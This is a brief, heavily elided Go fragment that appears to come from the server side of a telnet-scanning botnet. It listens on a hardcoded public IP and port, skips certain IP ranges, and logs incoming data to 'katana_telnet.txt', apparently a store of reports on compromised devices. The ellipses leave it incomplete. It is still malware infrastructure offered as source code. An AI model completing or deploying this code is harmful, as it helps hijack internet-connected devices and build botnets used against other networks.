...
func main() {
    l, err := net.Listen("tcp", "179.43.156.149:59736")
    if err != nil {
        fmt.Println(err)
        return
    }
...
func handleConnection(conn net.Conn) {
    ...
    if o1 == 76 && o2 == 105 && o3 >= 110 && o3 < 255 {
        return
    }
    if o1 == 90 && o2 == 9 && o3 >= 0 && o3 < 255 {
        return
    }
    ...
    file, err := os.OpenFile("katana_telnet.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
    if err != nil {
